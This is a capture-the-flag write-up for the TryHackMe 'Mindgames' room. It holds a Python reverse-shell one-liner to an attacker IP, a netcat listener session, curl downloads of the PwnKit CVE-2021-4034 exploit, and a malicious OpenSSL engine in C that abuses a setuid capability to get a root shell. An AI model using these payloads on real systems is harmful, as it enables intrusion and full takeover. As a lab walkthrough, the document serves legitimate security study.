## Mindgames
https://tryhackme.com/room/mindgames

## Enum
```
nmap -Pn -sC -sV -sT 10.10.21.76 -vv

Scanning 10.10.21.76 [1000 ports]
Discovered open port 80/tcp on 10.10.21.76
Discovered open port 22/tcp on 10.10.21.76
Completed Connect Scan at 20:02, 40.83s elapsed (1000 total ports)
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDffdMrJJJtZTQTz8P+ODWiDoe6uUYjfttKprNAGR1YLO6Y25sJ5JCAFeSfDlFzHGJXy5mMfV5fWIsdSxvlDOjtA4p+P/6Z2KoYuPoZkfhOBrSUZklOig4gF7LIakTFyni4YHlDddq0aFCgHSzmkvR7EYVl9qfxnxR0S79Q9fYh6NJUbZOwK1rEuHIAODlgZmuzcQH8sAAi1jbws4u2NtmLkp6mkacWedmkEBuh4YgcyQuh6jO+Qqu9bEpOWJnn+GTS3SRvGsTji+pPLGnmfcbIJioOG6Ia2NvO5H4cuSFLf4f10UhAC+hHy2AXNAxQxFCyHF0WVSKp42ekShpmDRpP
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNlJ1UQ0sZIFC3mf3DFBX0chZnabcufpCZ9sDb7q2zgiHsug61/aTEdedgB/tpQpLSdZi9asnzQB4k/vY37HsDo=
|   256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKrqeEIugx9liy4cT7tDMBE59C9PRlEs2KOizMlpDM8h
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
nmap -Pn 10.10.21.76 -p- --open --min-rate=5000

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

🏴 I have seen that code other CTF. It's Brainf*ck!.

Muuuu,I couldn't use bash shell.

![3](https://user-images.githubusercontent.com/6504854/189129213-44158cd1-14f2-4d03-8800-e31b913cdba5.PNG)
![2](https://user-images.githubusercontent.com/6504854/189130708-d06f3aba-5daf-484a-9eac-12d2d15e627e.PNG)

🏴 I tried to insert some test code, It's PHP or Python? I put PHP code failed, python code(no space) worked.

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

## Flag
```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.21.76] 45728
$ id
id
uid=1001(mindgames) gid=1001(mindgames) groups=1001(mindgames)
$ python3 -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"

mindgames@mindgames:~/webserver$ ls -la
ls -la
total 7032
drwxrwxr-x 3 mindgames mindgames    4096 May 11  2020 .
drwxr-xr-x 6 mindgames mindgames    4096 May 11  2020 ..
drwxrwxr-x 2 mindgames mindgames    4096 May 11  2020 resources
-rwxrwxr-x 1 mindgames mindgames 7188315 May 11  2020 server

mindgames@mindgames:~/webserver$ cd /home
cd /home

mindgames@mindgames:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root      root      4096 May 11  2020 .
drwxr-xr-x 24 root      root      4096 May 11  2020 ..
drwxr-xr-x  6 mindgames mindgames 4096 May 11  2020 mindgames
drwxr-x---  5 tryhackme tryhackme 4096 May 11  2020 tryhackme

mindgames@mindgames:/home$ cd mindgames
cd mindgames

mindgames@mindgames:~$ cat user.txt
cat user.txt
thm{41******************************}

mindgames@mindgames:~$ cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: Permission denied

mindgames@mindgames:~$ sudo -l
sudo -l
[sudo] password for mindgames: 


mindgames@mindgames:~/webserver/resources$  ls -la /usr/bin/pkexec
 ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec

mindgames@mindgames:~/webserver$ cd ../../
cd ../../

mindgames@mindgames:~$ curl -s http://10.10.10.10/1.tar -o 2.tar
curl -s http://10.10.10.10/1.tar -o 2.tar

mindgames@mindgames:~$ tar -xvf 2.tar
tar -xvf 2.tar
./cve-2021-4034
./pwnkit.so
./README.md

mindgames@mindgames:~$ ./cve-2021-4034
./cve-2021-4034

# cat /root/root.txt
cat /root/root.txt
thm{19**********************}
```

### Another Path

![image](https://user-images.githubusercontent.com/6504854/189137060-cb5f5e19-301b-4076-b75b-114d18582e7c.png)

🏴 /usr/bin/openssl = cap_setuid+ep

https://gtfobins.github.io/gtfobins/openssl/#library-load

https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/

```
sudo apt install libssl-dev
vi 1.c
```
```
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0);
    system("/bin/sh");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
🏴 I saved as 1.c

```
gcc -fPIC -o 1.o -c 1.c
gcc -shared -o 1.so -lcrypto 1.o
```

```
$ curl http://10.10.10.10/1.so -o 1.so
$ openssl req -engine ./1.so
# cat /root/root.txt
thm{19************************}
#
```

Thank you for your time, Happy Hacking 😄

毎回難しい。酒のんでねよ。 😪😪😪
